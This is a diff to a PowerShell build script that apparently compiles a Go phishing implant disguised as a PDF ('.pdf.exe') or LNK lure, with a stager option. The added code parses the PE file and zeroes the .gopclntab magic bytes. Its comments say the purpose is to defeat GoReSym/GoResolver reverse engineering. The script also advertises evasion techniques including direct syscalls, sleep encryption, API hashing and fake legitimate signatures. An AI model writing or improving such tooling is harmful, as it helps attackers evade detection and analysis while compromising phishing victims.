@@ -51,6 +51,7 @@ if ($Platform -eq "windows" -and -not $Console) {
 }
 
 $gcflags = "all=-l -N"
+$asmflags = "all=-trimpath"
 
 $outputName = if ($Platform -eq "windows") { 
     if ($Chain -eq "pdf") { "$PdfName.pdf.exe" } else { "fish.exe" }
@@ -107,7 +108,7 @@ if ($Garble) {
         $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = ""
     }
     Write-Host "[+] Garble: -literals -seed=random"
-    garble -literals -seed=random build -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
+    garble -literals -seed=random build -trimpath -ldflags $ldflags -gcflags $gcflags -asmflags $asmflags -o $outputName $buildTarget
 } else {
     go build -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
 }
@@ -275,6 +276,37 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
         Write-Host "[-] Skipping Rich Header clear"
     }
 
+    # P0: Zero gopclntab magic bytes to break GoResolver/GoReSym static analysis
+    # Go runtime uses internal firstmoduledata pointer (set at link time), NOT PE parsing
+    # So zeroing pclntab magic in PE section doesn't affect runtime, only breaks RE tools
+    Write-Host "[+] Zeroing .gopclntab magic (P0 pclntab obfuscation)..."
+    $bytes = [System.IO.File]::ReadAllBytes($outputName)
+    # PE解析：找到 .gopclntab section
+    $dosHeader = $bytes[0..63]
+    $peOffset = [System.BitConverter]::ToUInt32($dosHeader, 0x3C)
+    $peSig = [System.Text.Encoding]::ASCII.GetString($bytes, $peOffset, 4)
+    if ($peSig -eq "PE`0`0") {
+        $numSections = [System.BitConverter]::ToUInt16($bytes, $peOffset + 6)
+        $optHeaderSize = [System.BitConverter]::ToUInt16($bytes, $peOffset + 20)
+        $sectionStart = $peOffset + 24 + $optHeaderSize
+        for ($s = 0; $s -lt $numSections; $s++) {
+            $secOff = $sectionStart + $s * 40
+            $secName = [System.Text.Encoding]::ASCII.GetString($bytes, $secOff, 8).TrimEnd([char]0)
+            if ($secName -eq ".gopclntab") {
+                $rawAddr = [System.BitConverter]::ToUInt32($bytes, $secOff + 20)
+                $rawSize = [System.BitConverter]::ToUInt32($bytes, $secOff + 16)
+                # Zero magic bytes (first 16 bytes) + randomize first 64 bytes of pclntab data
+                $zeroLen = [Math]::Min(64, $rawSize)
+                for ($j = 0; $j -lt $zeroLen; $j++) {
+                    $bytes[$rawAddr + $j] = 0x00
+                }
+                Write-Host "[+] .gopclntab magic zeroed (first $zeroLen bytes at raw offset $rawAddr)"
+                break
+            }
+        }
+    }
+    [System.IO.File]::WriteAllBytes($outputName, $bytes)
+
     # 4. Add fake legitimate program signature strings
     if (-not $SkipLegitSignatures) {
         Write-Host "[+] Adding legitimate program signatures..."
@@ -377,7 +409,7 @@ Write-Host "[+] String Zeroing: $stringZeroStatus"
 Write-Host "[+] Post Steps: $postStepsSummary"
 $iconStatus = if ($Chain -eq "pdf" -and $Platform -eq "windows" -and (Test-Path (Join-Path $PSScriptRoot "pdf\rsrc_amd64.syso"))) { "PDF icon embedded" } elseif ($Chain -eq "lnk" -and $Platform -eq "windows") { "LNK icon (via phish.ps1)" } else { "None" }
 Write-Host "[+] Icon: $iconStatus"
-Write-Host "[+] Evasion: Halo's Gate (Direct Syscall) + API Hashing + Callback Exec + String Zeroing + PE Timestamp + Rich Header Clear + Overlay"
+Write-Host "[+] Evasion: Halo's Gate (Direct Syscall) + Ekko Sleep Encryption + pclntab Obfuscation + API Hashing + Callback Exec + String Zeroing + PE Timestamp + Rich Header Clear + Overlay"
 if ($BuildStager) {
     $stagerInfo = Get-Item stager.exe -ErrorAction SilentlyContinue
     if ($stagerInfo) {
